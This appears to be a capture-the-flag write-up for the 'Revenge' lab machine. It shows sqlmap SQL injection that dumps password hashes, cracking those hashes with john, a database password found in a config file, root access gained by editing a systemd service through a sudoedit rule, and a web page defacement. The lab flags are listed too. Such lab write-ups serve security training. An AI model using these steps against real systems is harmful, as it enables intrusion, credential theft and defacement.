# Revenge 

> VOiD | Tuesday 01 March 2022 03:54:47 PM UTC

My IP : 10.8.253.221
Target IP : 10.10.112.3




## PORT 80 [http]
```bash

sqlmap -u http://10.10.112.3/products/4  --level=5 --batch

sqlmap -u http://10.10.112.3/products/4 -D duckyinc  --level=5 -T system_user --dump  --batch

+----+----------------------+--------------+--------------------------------------------------------------+
| id | email                | username     | _password                                                    |
+----+----------------------+--------------+--------------------------------------------------------------+
| 1  | sadmin@duckyinc.org  | server-admin | $2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a |
| 2  | kmotley@duckyinc.org | kmotley      | $2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa |
| 3  | dhughes@duckyinc.org | dhughes      | $2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK |
+----+----------------------+--------------+--------------------------------------------------------------+


john --wordlist=/usr/share/wordlists/rockyou.txt hash

inuyasha         (server-admin)
```


## USER [server-admin]
```bash
server-admin@duckyinc:~$ cat flag2.txt 
thm{4lm0st_th3re}

sudo -l
Matching Defaults entries for server-admin on duckyinc:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User server-admin may run the following commands on duckyinc:
    (root) /bin/systemctl start duckyinc.service, /bin/systemctl enable
        duckyinc.service, /bin/systemctl restart duckyinc.service, /bin/systemctl
        daemon-reload, sudoedit /etc/systemd/system/duckyinc.service

server-admin@duckyinc:~$ find / -name duckyinc.service 2>/dev/null
/etc/systemd/system/multi-user.target.wants/duckyinc.service
/etc/systemd/system/duckyinc.service


app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://root:PurpleElephants90!@localhost/duckyinc'

6 | mandrews | $2a$12$reNFrUWe4taGXZNdHAhRme6UR2uX..t/XCR6UnzTK6sh1UhREd1rC | thm{br3ak1ng_4nd_3nt3r1ng} | ap@krasco.org                   | Krasco Org       |

thm{br3ak1ng_4nd_3nt3r1ng}

sudo /bin/systemctl start duckyinc.service
sudo /bin/systemctl restart duckyinc.service
sudo /bin/systemctl daemon-reload
sudoedit /etc/systemd/system/duckyinc.service

ExecStart=/bin/sh /tmp/script.sh

root@duckyinc:~# echo "duck" > /var/www/duckyinc/templates/index.html

root@duckyinc:~# cat flag3.txt 
thm{m1ss10n_acc0mpl1sh3d}


```
